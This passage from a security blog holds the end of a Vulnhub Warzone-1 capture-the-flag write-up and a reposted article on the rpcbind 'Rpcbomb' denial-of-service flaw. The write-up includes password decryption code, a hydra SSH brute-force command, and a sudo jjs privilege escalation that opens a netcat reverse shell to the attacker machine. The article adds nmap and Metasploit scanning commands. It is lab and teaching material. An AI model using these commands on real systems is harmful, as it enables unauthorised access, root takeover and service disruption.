&#123;</span><br><span class="line">     <span class="built_in">this</span>.iv = DEFAULT_IV;</span><br><span class="line">   &#125; </span><br><span class="line">   init();</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getHash(String algorithm, String text) &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> getHash(algorithm, text.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex.getMessage());</span><br><span class="line">   &#125; </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getHash(String algorithm, <span class="type">byte</span>[] data) &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="type">MessageDigest</span> <span class="variable">digest</span> <span class="operator">=</span> MessageDigest.getInstance(algorithm);</span><br><span class="line">     digest.update(data);</span><br><span class="line">     <span class="keyword">return</span> digest.digest();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex.getMessage());</span><br><span class="line">   &#125; </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="built_in">this</span>.cipher = Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex.getMessage());</span><br><span class="line">   &#125; </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">encrypt</span><span class="params">(String str)</span> &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> encrypt(str.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex.getMessage());</span><br><span class="line">   &#125; </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">encrypt</span><span class="params">(<span class="type">byte</span>[] data)</span> &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="built_in">this</span>.cipher.init(<span class="number">1</span>, <span class="built_in">this</span>.key, <span class="built_in">this</span>.iv);</span><br><span class="line">     <span class="type">byte</span>[] encryptData = <span class="built_in">this</span>.cipher.doFinal(data);</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(encryptData));</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex.getMessage());</span><br><span class="line">   &#125; </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encryptString</span><span class="params">(String content)</span> &#123;</span><br><span class="line">   <span class="type">Obfuscated</span> <span class="variable">obs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Obfuscated</span>();</span><br><span class="line">   <span class="type">AES</span> <span class="variable">ea</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AES</span>(obs.getIV(), <span class="number">128</span>, obs.getKey());</span><br><span class="line">   <span class="keyword">return</span> ea.encrypt(content);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Obfuscated.java</span><br><span class="line"><span class="keyword">package</span> Other;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Obfuscated</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">getIV</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;w4rz0n3s3cur31vv&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">getKey</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;w4rz0n3s3cur3k3y&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>2.将用户和加密后密码输入得到对应的用户及解密密码字典，利用hydra进行ssh爆破：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.dic -P pass.dic ssh://192.168.56.128</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-1/12.png" alt="image"></p>
-</blockquote>
-<h3><span id="初步提权">初步提权</span></h3><blockquote>
-<p>1.ssh登录commando用户，查看历史：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh commando@192.168.56.128</span><br><span class="line"></span><br><span class="line">cat .bash_history</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-1/13.png" alt="image"></p>
-<p>2.可以发现&#x2F;home&#x2F;captain&#x2F;Desktop目录下有user.txt，但我们无权查看：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/captain/Desktop</span><br><span class="line">ls -la</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-1/14.png" alt="image"></p>
-<p>3.在&#x2F;.crypt目录下能发现readme.txt，readme.txt提醒密码就在这里，还有一段加密程序encrypt.py和.c：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd .crypt</span><br><span class="line">ls -la</span><br><span class="line">cat readme.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-1/15.png" alt="image"></p>
-<p>4.查看encrypt.py，.c和script.sh，我们能够知道script.sh是将参数输入encrypt.py后由encrypt.py加密生成.c中的字串，我们可以写一个解密程序，将captain用户的密码解密出来：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat encrypt.py</span><br><span class="line">cat .c</span><br><span class="line">cat script.sh</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-1/16.png" alt="image"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pip3 install simple-crypt</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> simplecrypt <span class="keyword">import</span> encrypt, decrypt</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;sekret&#x27;</span></span><br><span class="line">text = base64.b64decode(<span class="string">&#x27;c2MAAk1Y/hAsEsn+FasElyXvGSI0JxD+n/SCtXbHNM+1/YEU54DO0EQRDfD3wz/lrbkXEBJJJd1ylXZpi/2dopaklmG6NCAXfGKl1eWAUNU1Iw==&#x27;</span>)</span><br><span class="line">passwd = decrypt(key, text)</span><br><span class="line"><span class="built_in">print</span>(passwd)</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-1/17.png" alt="image"></p>
-<p>5.登录到captain用户，可以查看第一个flag，user.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ..</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-1/18.png" alt="image"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.通过sudo -l命令，可以看到jjs（jjs是让javascript可以调用java）可以执行特权命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-1/19.png" alt="image"></p>
-<p>2.那我们可以写一个java的shell提权利用js去调用再使用jjs去执行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Java.type(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;/usr/bin/nc -e /bin/bash 192.168.56.102 1234&#x27;)&quot;|sudo jjs</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-1/20.png" alt="image"></p>
-<p>3.成功提权到root，并可以在&#x2F;root&#x2F;Desktop下发现第二个flag，root.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root/Desktop</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-1/21.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/Warzone/" rel="tag">Warzone</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/12/07/RPCBind-DDOS/">
-                111端口rpcbind漏洞
-            </a>
-        </h2>
-    
-    <time>
-        Dec 7, 2023
-    </time>
-    <section class="content">
-        <h1><span id="111端口rpcbind漏洞">111端口rpcbind漏洞</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44110913/article/details/108852581">Mamba start</a> 并作补充</p>
-</blockquote>
-<h2><span id="简介">简介</span></h2><blockquote>
-<p>rpcbind是NFS中用来进行消息通知的服务</p>
-</blockquote>
-<h2><span id="实验环境">实验环境</span></h2><blockquote>
-<p>攻击机：<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020">kali</a> linux<br>ip:192.168.172.134<br>目标机：Metasploittable2<br>ip:192.168.172.129</p>
-</blockquote>
-<h2><span id="攻击过程">攻击过程</span></h2><h3><span id="step1使用nmap探测">step1:使用nmap探测</span></h3><blockquote>
-<p>命令：<code>nmap 192.168.172.129</code></p>
-<p>命令：<code>nmap -sV -p 111 192.168.172.129</code></p>
-<p>命令：<code>nmap -p 111 --script=rpcinfo 192.168.172.129</code></p>
-</blockquote>
-<h3><span id="step2metasploit模块探测">step2:metasploit模块探测</span></h3><blockquote>
-<p>启动msf</p>
-<p>命令：<code>use auxiliary/scanner/misc/sunrpc_portmapper</code></p>
-<p>命令：<code>show options</code></p>
-<p>本文讲的是只需60字节就可通过rpcbind让服务器崩溃，全世界的人都知道这玩意儿的用处，人们就这么任由它一直开着，无语。所以，要么补上，要么关闭吧。</p>
-</blockquote>
-<h2><span id="写在后面">写在后面</span></h2><blockquote>
-<p>向rpcbind服务的UDP套接字发送60字节载荷，便可填充目标内存，搞崩主机系统。<br>圭多·乌兰肯，该漏洞发现者兼“Rpcbomb”漏洞利用程序开发者，抱怨称该软件包维护者毫无反应，他不得不自己写了补丁。</p>
-<p>漏洞利用&amp;补丁：<a target="_blank" rel="noopener" href="https://github.com/guidovranken/rpcbomb">https://github.com/guidovranken/rpcbomb</a></p>
-<p>他写道，Shodan搜索发现，互联网上开放 rpcbind 111 端口的主机有180万台。其中大多数都运行在AWS之类大规模托管上，用户总是直接沿用Linux发行版的默认配置(111端口开放)。</p>
-<p>如果你真的需要使用rpcbind服务(将远程过程调用RPC与地址绑定)，就把它置于防火墙后，限制111端口对外开放吧。最好就是直接关了。</p>
-<p>GitHub上的补丁足够小，开发者们应该可以验证这些补丁的短小精悍：rpcbind只需要两行代码就能修复，不像libtirpc要256行。</p>
-<p>乌兰肯称，该漏洞可使攻击者在远程rpcbind绑定主机上分配任意大小的内存(每次攻击最高可达4GB)，除非进程崩溃，或者管理员挂起&#x2F;重启rpcbind服务，否则该内存不会被释放。</p>
-<p>当然，除了不断占用目标系统的内存，攻击者还可以干别的事，因为有些软件在内存分配失败的时候，是会发生不可预知的错误的。</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/DOS/" rel="tag">DOS</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RPCBind/" rel="tag">RPCBind</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
